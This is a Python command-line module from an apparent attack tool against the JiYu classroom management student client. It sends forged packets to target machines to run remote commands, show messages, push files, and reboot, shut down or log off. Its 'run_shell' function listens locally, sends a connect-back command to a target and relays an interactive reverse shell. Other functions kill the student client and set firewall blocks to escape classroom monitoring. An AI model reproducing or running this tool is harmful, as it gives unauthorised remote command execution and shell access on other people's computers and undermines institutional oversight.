"""命令行参数解析与命令分发。"""

import sys
from os import system
from pathlib import Path
from queue import Empty, Queue
from threading import Thread
from time import sleep

from ..core import (
    FIREWALL_HELPER_ARGUMENT,
    LOGOFF_COMMAND,
    STUDENT_HELPER_ARGUMENT,
    ShellServer,
    basicCMD,
    cli_log,
    find_student_processes,
    format_size,
    get_ip,
    local_ip_and_ports,
    pkg_sendlist,
    portable_cli_log_path,
    read_message,
    request_firewall_rule,
    run_firewall_helper,
    run_student_helper,
    send_command,
    send_tracked,
    split_message,
    start_student_process,
    stop_student_processes,
    transfer_file,
)
from .parser import GROUP_NAMES, build_flat_parser, build_group_parser


def build_parser():
    """创建兼容旧写法的扁平参数解析器。

    具体参数定义在 ``app/cli/parser.py``，这里只保留函数名供既有调用方使用。

    Returns:
        argparse.ArgumentParser: 扁平参数解析器。
    """
    return build_flat_parser()


parser = build_parser()


# 只打印帮助或版本号的调用没有任何副作用，也不该在数据目录留下日志文件。
INFORMATIONAL_ARGUMENTS = ("-h", "--help", "-V", "--version")


def is_informational(arguments):
    """判断本次调用是否只是查看帮助或版本号。

    只认单独一个帮助或版本号参数；``-msg "-h"`` 这类把短横线内容当作
    参数值传进来的写法仍按普通发送处理，避免误跳过日志。

    Args:
        arguments: 命令行参数列表。

    Returns:
        bool: 只查帮助或版本号时为 ``True``。
    """
    return len(arguments) == 1 and arguments[0] in INFORMATIONAL_ARGUMENTS


def start_logging():
    """启用命令行日志；等级固定 DEBUG，文件名与界面日志分开。"""
    cli_log.configure(portable_cli_log_path())
    log = cli_log.LOG
    if log.storage_error:
        print("[-] %s" % log.storage_error)
        return log
    log.debug("命令行日志已启用", "命令行", "文件：%s" % log.path)
    return log


def create_send_packets(arguments):
    """根据 CLI 参数构造待发送的报文列表。"""
    log = cli_log.LOG
    send_list = []

    # 先统一读取消息来源，确保 -msg 与 --msg-file 的处理保持一致。
    message = read_message(arguments)
    if message:
        chunks = list(split_message(message))
        log.debug(
            "已读取消息",
            "消息",
            "字符数：%d，分条：%d" % (len(message), len(chunks)),
        )
        send_list.extend(pkg_sendlist("-msg", chunk) for chunk in chunks)

    if arguments.c:
        log.debug("已加入命令", "命令", "命令：%s" % arguments.c)
        send_list.append(pkg_sendlist("-c", arguments.c))

    # 重启与关机用来源项目的固定报文；注销没有独立报文，走远程命令通道。
    if arguments.e in {"r", "s"}:
        send_list.append(basicCMD["-" + arguments.e])
    elif arguments.e == "l":
        send_list.append(pkg_sendlist("-c", LOGOFF_COMMAND))

    return send_list


def single_command(arguments):
    """执行查询本机信息或切换本机防火墙规则等单项操作。"""
    log = cli_log.LOG
    if arguments.e == "g":
        try:
            ip, ports = local_ip_and_ports()
            if not ip:
                print("未能获取本机 IP 地址")
                log.warning("未能获取本机 IP 地址", "本机信息")
                return
            print("\\nYour ip addres is:" + ip)
            print("\\nYour student client possible ports are:" + ",".join(ports))
            log.info(
                "已获取本机信息", "本机信息", "IP：%s，端口：%s" % (ip, ",".join(ports))
            )
        except Exception as error:
            print("[-] %s" % error)
            log.error("获取本机信息失败", "本机信息", "异常：%r" % error)
        return

    elif arguments.e == "break":
        results = request_firewall_rule("block")
        sleep(1)
        system("cls")
        failed = any(not item["success"] for item in results)
        print(
            "[-] 部分防火墙设置失败，请检查管理员权限" if failed else "防火墙规则已阻断"
        )
        log_line = "防火墙规则已阻断" if not failed else "部分防火墙设置失败"
        log.add("WARNING" if failed else "INFO", log_line, "防火墙")
        return

    elif arguments.e == "continue":
        results = request_firewall_rule("allow")
        failed = any(not item["success"] for item in results)
        if failed:
            print("[-] 部分防火墙设置失败，请检查管理员权限")
            log.warning("部分防火墙设置失败，请检查管理员权限", "防火墙")
            return
        print("防火墙规则已恢复")
        log.info("防火墙规则已恢复", "防火墙")
        return


def run_file_transfer(arguments):
    """执行文件传送并输出传送结果。"""
    log = cli_log.LOG
    # argparse 给出的是列表；直接调用时允许传单个路径，统一成列表再下发。
    paths = arguments.file
    if isinstance(paths, (str, Path)):
        paths = [str(paths)]
    else:
        paths = [str(path) for path in paths]
    log.info("开始文件传送", "文件传送", "目标：%s" % arguments.ip)
    log.debug(
        "文件传送参数",
        "文件传送",
        "路径：%s；端口：%s；发送端：%s；超时：%s 秒"
        % (paths, arguments.p, arguments.file_ip or "自动检测", arguments.file_timeout),
    )
    result = transfer_file(
        arguments.ip,
        arguments.p,
        paths[0],
        listen_ip=arguments.file_ip,
        timeout=arguments.file_timeout,
        report=print,
        paths=paths,
    )
    log.debug(
        "文件传送完成",
        "文件传送",
        "文件：%s；数量：%s；大小：%d 字节；监听端口：%s"
        % (
            result.get("files"),
            result.get("file_count"),
            result["size"],
            result["port"] if result.get("port") is not None else "未启动",
        ),
    )
    if len(result["targets"]) == 1:
        print("文件已传送：%s（%s）" % (result["name"], format_size(result["size"])))
    else:
        print(
            "文件已传送到 %d 个目标桌面：%s（%s）"
            % (len(result["targets"]), result["name"], format_size(result["size"]))
        )
    log.info("文件已传送", "文件传送", "目标：%s" % "、".join(result["transferred"]))
    return 0


def print_delivery(outcome):
    """逐个目标输出送达判定，并给出成功与失败的数量。

    判定依据只有网络反馈：收到 ICMP 不可达说明报文没有被接收端收到，
    没有反馈只能说“未发现异常”，无法证明对方执行了命令。
    """
    log = cli_log.LOG
    for item in outcome.deliveries:
        if item.ok:
            print(
                "[成功] %s：%s（%d 个报文）" % (item.host, item.state.text, item.sent)
            )
            log.info(
                "目标送达未发现异常",
                "发送",
                "%s：%s（%d 个报文）" % (item.host, item.state.text, item.sent),
            )
        elif item.detail:
            print("[-] [失败] %s：%s（%s）" % (item.host, item.state.text, item.detail))
            log.error(
                "目标发送失败",
                "发送",
                "%s：%s（%s）" % (item.host, item.state.text, item.detail),
            )
        else:
            print("[-] [失败] %s：%s" % (item.host, item.state.text))
            log.error("目标发送失败", "发送", "%s：%s" % (item.host, item.state.text))
    total = len(outcome.deliveries)
    failed = len(outcome.failed)
    if failed:
        print("共 %d 个目标：成功 %d，失败 %d" % (total, total - failed, failed))
    else:
        print("共 %d 个目标：全部未发现异常" % total)


def log_arguments(arguments):
    """把本次参数快照写进日志，便于事后复现。"""
    cli_log.LOG.debug(
        "命令行参数",
        "命令行",
        "ip=%s；port=%s；msg=%s；msg_file=%s；file=%s；c=%s；l=%s；t=%s；e=%s；"
        "file_ip=%s；file_timeout=%s"
        % (
            arguments.ip,
            arguments.p,
            arguments.msg,
            arguments.msg_file,
            arguments.file,
            arguments.c,
            arguments.l,
            arguments.t,
            arguments.e,
            arguments.file_ip,
            arguments.file_timeout,
        ),
    )


def run_action(arguments):
    """执行需要立刻返回的一次性动作，返回是否已处理本次调用。"""
    if arguments.shell:
        return run_shell(arguments)
    return False


def run_shell(arguments):
    """启动反弹终端：本机监听、下发连接命令，并把本机终端接到会话上。"""
    log = cli_log.LOG
    host = get_ip(arguments.ip)[0]
    server = ShellServer(port=arguments.shell_port, local_ip=arguments.shell_ip or None)
    server.start()
    try:
        print(
            "本机监听 %s:%d，脚本服务端口 %d"
            % (server.address, server.port, server.http_port),
            flush=True,
        )
        command = server.command()
        print("向 %s 下发连接命令（%d 个字符）" % (host, len(command)), flush=True)
        send_command(host, command, port=arguments.p, report=print)
        log.info(
            "反弹终端",
            "反弹终端",
            "目标：%s；监听端口：%d" % (host, server.port),
        )
        relay_shell(server, host)
    finally:
        server.close()
        print("已停止监听与脚本服务", flush=True)
    return True


def relay_shell(server, host):
    """把本机终端与目标会话接起来：本机输入发过去，目标输出回显。"""
    if sys.stdin is None:
        print("当前没有可用的标准输入，只显示目标输出；按 Ctrl+C 结束", flush=True)
        _stream_shell(server)
        return
    lines = Queue()
    Thread(target=_read_stdin, args=(lines,), daemon=True).start()
    print("等待 %s 连回，输入 exit 结束会话" % host, flush=True)
    announced = False
    while True:
        output = server.poll()
        if output:
            if not announced:
                announced = True
                print("目标已连回，可以直接输入命令：", flush=True)
            sys.stdout.write(output)
            sys.stdout.flush()
        if announced and not server.connected:
            print("目标已断开", flush=True)
            return
        try:
            line = lines.get(timeout=0.2)
        except Empty:
            continue
        if line is None:
            # 输入结束（管道读完或用户按了 Ctrl+Z），把剩下的输出收完再退出。
            sleep(0.5)
            output = server.poll()
            if output:
                sys.stdout.write(output)
                sys.stdout.flush()
            return
        text = line.rstrip()
        if text.strip().lower() in {"exit", "quit"}:
            print("结束会话", flush=True)
            return
        if not server.connected:
            print("目标还没连回来，命令未发送：%s" % text, flush=True)
            continue
        server.send(text)


def _read_stdin(lines):
    """把标准输入逐行放进队列，读到结尾时放一个 None 作为结束标记。"""
    stream = sys.stdin
    if stream is None:
        lines.put(None)
        return
    try:
        for line in stream:
            lines.put(line)
    except (OSError, ValueError):
        pass
    lines.put(None)


def _stream_shell(server):
    """没有标准输入时只回显目标输出，直到连接断开或用户中断。"""
    announced = False
    try:
        while True:
            output = server.poll()
            if output:
                if not announced:
                    announced = True
                    print("目标已连回，正在显示输出：", flush=True)
                sys.stdout.write(output)
                sys.stdout.flush()
            elif announced and not server.connected:
                print("目标已断开", flush=True)
                return
            sleep(0.2)
    except KeyboardInterrupt:
        print("已结束会话", flush=True)


def run_from_cmd(arguments):
    """校验参数并分发 CLI 请求。"""
    log_arguments(arguments)
    log = cli_log.LOG
    try:
        if arguments.endstudent or arguments.list or arguments.start_student:
            return run_student_command(arguments)
        if arguments.firewall:
            results = request_firewall_rule(arguments.firewall)
            failed = any(not item["success"] for item in results)
            if failed:
                print("[-] 部分防火墙设置失败，请检查管理员权限")
                log.warning("部分防火墙设置失败，请检查管理员权限", "防火墙")
                return 1
            print(
                "防火墙规则已阻断"
                if arguments.firewall == "block"
                else "防火墙规则已恢复"
            )
            log.info("防火墙规则已更新", "防火墙", "动作：%s" % arguments.firewall)
            return 0
        if run_action(arguments):
            return
        if arguments.e == "nc":
            return run_shell(arguments)
        single_command(arguments)
        if arguments.e in {"g", "break", "continue"}:
            return
        if arguments.file:
            if arguments.e or arguments.msg or arguments.msg_file or arguments.c:
                raise ValueError("文件传送不能与消息、命令或 -e 扩展功能同时使用")
            return run_file_transfer(arguments)
        if arguments.file_ip or arguments.file_timeout != 120:
            raise ValueError("--file-ip 和 --file-timeout 仅用于文件传送")
        send_list = create_send_packets(arguments)
        if send_list:
            log.info(
                "开始发送",
                "发送",
                "目标：%s；端口：%d；报文：%d 个；循环：%d 次；间隔：%d 秒"
                % (
                    arguments.ip,
                    arguments.p,
                    len(send_list),
                    arguments.l,
                    arguments.t,
                ),
            )
            outcome = send_tracked(
                send_list,
                arguments.ip,
                arguments.p,
                arguments.l,
                arguments.t,
                report=print,
            )
            print_delivery(outcome)
        else:
            raise ValueError("请至少指定消息、命令或 -e 扩展功能")
    except Exception as e:
        print("[-] %s" % e)
        log.error("命令执行失败", "命令行", "异常：%s" % e)
        return 1
    return 0


def _print_student_list(processes):
    """打印学生端进程列表，返回是否为空。"""
    if not processes:
        print("本机没有正在运行的学生端进程")
        return False
    for item in processes:
        ports = ", ".join(str(port) for port in item["ports"]) or "-"
        tail = ""
        if item.get("path") and not item.get("genuine"):
            tail = "  （目录里没有 LibTDMaster.dll，可能不是极域学生端）"
        print(
            "[*] PID %d  %s  端口 %s  路径 %s%s"
            % (
                item["pid"],
                item["name"],
                ports,
                item.get("path") or "不可读（需要管理员）",
                tail,
            )
        )
    return True


def _start_student(arguments):
    """启动学生端，返回退出码。"""
    log = cli_log.LOG
    results = start_student_process(arguments.student_exe)
    for item in results:
        print(("[+] " if item["success"] else "[-] ") + str(item.get("output", "")))
        if item["success"]:
            print("已启动学生端：%s" % item["path"])
            log.info("已启动学生端", "解除限制", "程序：%s" % item["path"])
        if not item.get("confirmed", True):
            print("[-] 没有检测到学生端进程，可能被安全软件拦下，试试用管理员权限运行")
    failed = [item for item in results if not item["success"]]
    if failed:
        log.error("启动学生端失败", "解除限制", "程序：%s" % failed[0]["path"])
        return 1
    return 0


def _stop_student(arguments, pids):
    """结束学生端，返回退出码。"""
    log = cli_log.LOG
    results = stop_student_processes(pids)
    for item in results:
        stage = "强制" if item.get("forced") else "正常"
        print(
            ("[+] " if item["success"] else "[-] ") + "%s：%s" % (stage, item["output"])
        )
    failed = [item for item in results if not item["success"]]
    if failed:
        log.error(
            "结束学生端失败",
            "解除限制",
            "失败进程：%s" % ", ".join(str(item["pid"]) for item in failed),
        )
        return 1
    print("已结束 %d 个学生端进程" % len(results))
    log.info("已结束学生端进程", "解除限制", "共 %d 个" % len(results))
    return 0


def run_student_command(arguments):
    """列出、启动或结束本机学生端。

    与界面上的单按钮一致：什么都不指定时按当前状态决定方向——有进程就结束，
    没有就启动。``--list`` 只列进程，``--start`` 强制启动，``--pid`` 只结束
    指定进程。

    Args:
        arguments: 解析后的参数。

    Returns:
        int: 0 表示成功，1 表示有进程未能启动或结束。
    """
    log = cli_log.LOG
    processes = find_student_processes()
    if arguments.list:
        _print_student_list(processes)
        log.info("已列出学生端进程", "解除限制", "共 %d 个" % len(processes))
        return 0
    if arguments.start_student:
        print("启动学生端：%s" % (arguments.student_exe or "自动查找安装位置"))
        return _start_student(arguments)
    if arguments.pid:
        print("结束指定的 %d 个学生端进程" % len(arguments.pid))
        return _stop_student(arguments, arguments.pid)
    if processes:
        print("检测到 %d 个学生端进程，按当前状态执行结束" % len(processes))
        _print_student_list(processes)
        return _stop_student(arguments, None)
    print("本机没有学生端进程，按当前状态执行启动")
    return _start_student(arguments)


def _select_parser(arguments):
    """按首个参数选择分类写法或扁平写法的解析器。

    Args:
        arguments: 去掉程序名之后的参数列表。

    Returns:
        argparse.ArgumentParser: 首参数是 ``restriction``/``remote``/``local``
        时返回分类解析器，否则返回扁平解析器。
    """
    if arguments[:1] and arguments[0] in (*GROUP_NAMES, "-h", "--help"):
        return build_group_parser()
    return parser


def main(argv=None):
    """解析参数并执行 CLI 或隐藏的防火墙助手。"""
    arguments = list(sys.argv[1:] if argv is None else argv)
    if arguments[:1] == [FIREWALL_HELPER_ARGUMENT]:
        return run_firewall_helper(arguments[1:])
    if arguments[:1] == [STUDENT_HELPER_ARGUMENT]:
        return run_student_helper(arguments[1:])
    if is_informational(arguments):
        # 帮助与版本号走 argparse 自身的退出路径，不创建数据目录与日志文件。
        _select_parser(arguments).parse_args(arguments)
        return 0
    start_logging()
    cli_log.LOG.info(
        "命令行启动",
        "命令行",
        "参数：%s" % (" ".join(arguments) if arguments else "无"),
    )
    try:
        code = run_from_cmd(_select_parser(arguments).parse_args(arguments))
    except SystemExit as error:
        # --help 与 --version 也用 SystemExit 结束，退出码 0 属于正常结束。
        if error.code in (0, None):
            cli_log.LOG.info("参数解析结束", "命令行", "退出码：%s" % error.code)
        else:
            cli_log.LOG.warning("参数解析未通过", "命令行", "退出码：%s" % error.code)
        cli_log.close()
        raise
    except BaseException:
        cli_log.close()
        raise
    cli_log.LOG.info("命令行结束", "命令行", "退出码：%s" % code)
    cli_log.close()
    return code
